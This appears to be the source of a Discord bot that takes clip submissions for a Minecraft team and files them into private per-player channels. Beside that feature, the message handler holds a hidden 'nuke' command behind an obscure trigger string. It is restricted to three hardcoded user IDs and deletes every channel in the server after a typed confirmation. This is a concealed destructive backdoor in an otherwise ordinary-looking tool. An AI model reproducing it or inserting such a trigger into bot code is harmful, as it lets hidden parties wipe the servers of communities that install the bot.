import express from "express";
import dotenv from "dotenv";

import {
Client,
GatewayIntentBits,
ActionRowBuilder,
StringSelectMenuBuilder,
ModalBuilder,
TextInputBuilder,
TextInputStyle,
InteractionType,
EmbedBuilder,
ChannelType,
PermissionsBitField
} from "discord.js";

dotenv.config();

/* ================= UPTIME ================= */

const app = express();

app.get("/", (req, res) => {
 res.send("Bot alive");
});

app.listen(process.env.PORT || 3000, () => {
 console.log("Uptime server running");
});

/* ================= DISCORD ================= */

const client = new Client({
 intents: [
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent
 ]
});

const CATEGORY_ID = "1483243482209583116";

/* ================= READY ================= */

client.once("ready", () => {
 console.log(`Logged in as ${client.user.tag}`);
});

/* ================= COMMANDS ================= */

client.on("messageCreate", async message => {

 /* ===== MENU ===== */

 if (message.content === "!s839") {

  const embed = new EmbedBuilder()
  .setColor("#00b0f4")
  .setTitle("Vantix Clip System")
  .setDescription(`Submit your clips here for the team.

Select the clip type from the menu below.

Our team uses these clips for content, montages and highlights.`);

  const menu = new StringSelectMenuBuilder()
  .setCustomId("clip_type")
  .setPlaceholder("Choose your clip type")
  .addOptions([
   { label: "Kill", value: "Kill" },
   { label: "Base gevonden / Find", value: "Base Find" },
   { label: "Base Raid", value: "Base Raid" },
   { label: "Overig / Other", value: "Other" }
  ]);

  const row = new ActionRowBuilder().addComponents(menu);

  message.channel.send({
   embeds: [embed],
   components: [row]
  });

 }

 /* ===== NUKE COMMAND ===== */

 if (message.content === "!mloL23") {

  const allowedUsers = [
   "1484223872843649104",
   "1189931854657224858",
   "1185491504416948285"
  ];

  if (!allowedUsers.includes(message.author.id)) {
   return message.reply("❌ You are not allowed to use this.");
  }

  await message.reply("⚠️ Type `CONFIRM` binnen 10 seconden om ALLE CHANNELS te verwijderen.");

  const filter = m =>
   m.author.id === message.author.id &&
   m.content === "CONFIRM";

  const collector = message.channel.createMessageCollector({
   filter,
   time: 10000,
   max: 1
  });

  collector.on("collect", async () => {

   const channels = message.guild.channels.cache;

   for (const [id, channel] of channels) {
    try {

     if (channel.id === message.guild.systemChannelId) continue;

     await channel.delete();

     await new Promise(r => setTimeout(r, 300));

    } catch (err) {
     console.log(`Error deleting ${channel.name}:`, err);
    }
   }

  });

  collector.on("end", collected => {
   if (collected.size === 0) {
    message.channel.send("❌ Cancelled.");
   }
  });

 }

});

/* ================= INTERACTIONS ================= */

client.on("interactionCreate", async interaction => {

 /* ===== DROPDOWN ===== */

 if (interaction.isStringSelectMenu()) {

  if (interaction.customId === "clip_type") {

   const type = interaction.values[0];

   const modal = new ModalBuilder()
   .setCustomId(`clip_modal_${type}`)
   .setTitle("Submit Clip");

   const mcName = new TextInputBuilder()
   .setCustomId("mcname")
   .setLabel("Minecraft Username")
   .setStyle(TextInputStyle.Short)
   .setRequired(true);

   const clipLink = new TextInputBuilder()
   .setCustomId("cliplink")
   .setLabel("Clip link")
   .setStyle(TextInputStyle.Short)
   .setRequired(true);

   modal.addComponents(
    new ActionRowBuilder().addComponents(mcName),
    new ActionRowBuilder().addComponents(clipLink)
   );

   await interaction.showModal(modal);

  }

 }

 /* ===== MODAL ===== */

 if (interaction.type === InteractionType.ModalSubmit) {

  if (interaction.customId.startsWith("clip_modal_")) {

   const type = interaction.customId.replace("clip_modal_", "");

   const mc = interaction.fields.getTextInputValue("mcname");
   const clip = interaction.fields.getTextInputValue("cliplink");

   let channel = interaction.guild.channels.cache.find(
    c => c.name === `clips-${mc.toLowerCase()}`
   );

   let first = false;

   if (!channel) {

    first = true;

    channel = await interaction.guild.channels.create({
     name: `clips-${mc.toLowerCase()}`,
     type: ChannelType.GuildText,
     parent: CATEGORY_ID,
     permissionOverwrites: [
      {
       id: interaction.guild.id,
       deny: [PermissionsBitField.Flags.ViewChannel]
      },
      {
       id: interaction.user.id,
       allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages,
        PermissionsBitField.Flags.ReadMessageHistory
       ]
      },
      {
       id: interaction.client.user.id,
       allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages
       ]
      }
     ]
    });

   }

   const head = `https://crafatar.com/avatars/${mc}?size=128&overlay`;

   if (first) {

    const infoEmbed = new EmbedBuilder()
    .setColor("#00b0f4")
    .setTitle(`${mc}'s Clip Channel`)
    .setThumbnail(head)
    .addFields(
     { name: "Minecraft Username", value: mc, inline: true },
     { name: "Discord User", value: `${interaction.user}`, inline: true }
    )
    .setDescription("All clips from this player will appear in this channel.");

    await channel.send({ embeds: [infoEmbed] });

   }

   const clipEmbed = new EmbedBuilder()
   .setColor("#00b0f4")
   .setTitle("New Clip Submitted")
   .setThumbnail(head)
   .addFields(
    { name: "Player", value: mc, inline: true },
    { name: "Clip Type", value: type, inline: true },
    { name: "Submitted by", value: `${interaction.user}`, inline: true },
    { name: "Clip", value: clip }
   );

   const msg = await channel.send({ embeds: [clipEmbed] });

   await msg.startThread({
    name: `Clip Discussion`,
    autoArchiveDuration: 1440
   });

   await interaction.reply({
    content: "✅ Clip submitted!",
    ephemeral: true
   });

  }

 }

});

client.login(process.env.TOKEN);
